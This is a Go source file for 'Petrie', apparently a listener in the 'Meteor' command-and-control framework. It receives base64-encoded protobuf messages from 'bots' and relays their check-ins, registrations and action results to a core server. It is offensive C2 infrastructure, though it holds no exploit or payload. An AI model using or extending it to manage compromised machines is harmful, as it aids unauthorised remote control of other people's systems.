package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	lUtils "github.com/degenerat3/meteor/listeners/utils"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"log"
	"net"
	"os"
	"strings"
)

var (
	// PORT is the port that Petrie comms will be recieved on
	PORT = os.Getenv("PETRIE_PORT")

	// CORESERVER is the IP:Port of the Meteor core
	CORESERVER = os.Getenv("CORE_SERVER") // format: 9.9.9.9:9999

	// LOGPATH is the output path (including fname) for the listener logs
	LOGPATH = os.Getenv("LOGPATH")

	// write info logs to this
	infoLog *log.Logger

	// write warning logs to this
	warnLog *log.Logger

	// write all errors to this
	errLog *log.Logger
)

func main() {
	infoLog, warnLog, errLog = lUtils.InitLogger(LOGPATH)
	portStr := ":" + PORT
	l, err := net.Listen("tcp4", portStr)
	if err != nil {
		errLog.Println(err.Error())
		os.Exit(1)
	}

	defer l.Close()
	infoLog.Println("Listening for Petrie connections on port: " + PORT)
	for {
		conn, err := l.Accept()
		if err != nil {
			errLog.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go connHandle(conn)
	}
}

func connHandle(conn net.Conn) {
	data, _ := bufio.NewReader(conn).ReadString('\n')
	data = strings.TrimSuffix(data, "\n")
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		errLog.Println("Error decoding b64: " + err.Error())
	}
	comms := &mcs.MCS{}
	err = proto.Unmarshal(decoded, comms)
	if err != nil {
		errLog.Println("Error unmarshalling client data: " + err.Error())
		return
	}
	md := comms.GetMode()
	var retData []byte
	if md == "checkin" {
		infoLog.Println("Handling checkin from bot: " + comms.GetUuid())
		retData = lUtils.HandleCheckin(comms.GetUuid(), CORESERVER)
	} else if md == "register" {
		infoLog.Println("Handling register from bot: " + comms.GetUuid())
		retData = lUtils.HandleReg(comms.GetUuid(), comms.GetInterval(), comms.GetDelta(), comms.GetHostname(), CORESERVER)
	} else if md == "addResult" {
		infoLog.Println("Handling addResult for action: " + comms.GetUuid())
		retData = lUtils.HandleAddRes(comms.GetUuid(), comms.GetResult(), CORESERVER)
	} else {
		warnLog.Println("Recieved an unknown mode")
		conn.Write([]byte(""))
	}
	encoded := base64.StdEncoding.EncodeToString(retData)
	fmt.Fprintf(conn, "%s\n", encoded)
	return
}
